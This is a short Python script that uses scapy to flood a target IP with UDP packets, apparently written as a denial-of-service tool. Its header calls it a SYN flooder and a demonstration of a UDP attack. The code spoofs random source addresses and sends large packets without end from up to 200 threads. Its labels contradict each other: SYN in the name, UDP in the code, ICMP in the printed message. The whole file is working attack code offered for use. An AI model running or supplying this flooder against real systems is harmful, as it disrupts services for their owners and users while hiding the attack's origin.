#!/usr/bin/env python

##########################################
# 
# SYNflood - A multithreaded udp Flooder
# By Wei Gao
#
#release date: Aug 16 2012
# This script is a demonstration of a udp Attack 
#
#########################################
import socket, random, sys, threading
from scapy.all import *

if len(sys.argv) != 3:
	print "Usage: %s <Interface> <Target IP>" % sys.argv[0]
	sys.exit(1)

interface = sys.argv[1]
target = sys.argv[2]

thread_limit = 200   #thread limit 40 will be okay? 
total = 0
#scapy.conf.iface = interface

class sendSYN(threading.Thread):
	global target
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
          resource = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
          sendp(IP(src = resource, dst = target)/UDP(sport = random.randint(1, 65535), dport = random.randint(1, 65535))/("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" * 6), iface = interface, loop=1, inter=0.2)
          #srloop(p,inter=0.1,retry=2,timeout=4, iface = interface)


print "Flooding %s: with ICMP packets." % (target)
while 1:
	if threading.activeCount() < thread_limit: 
		sendSYN().start()
		total += 1
		sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)

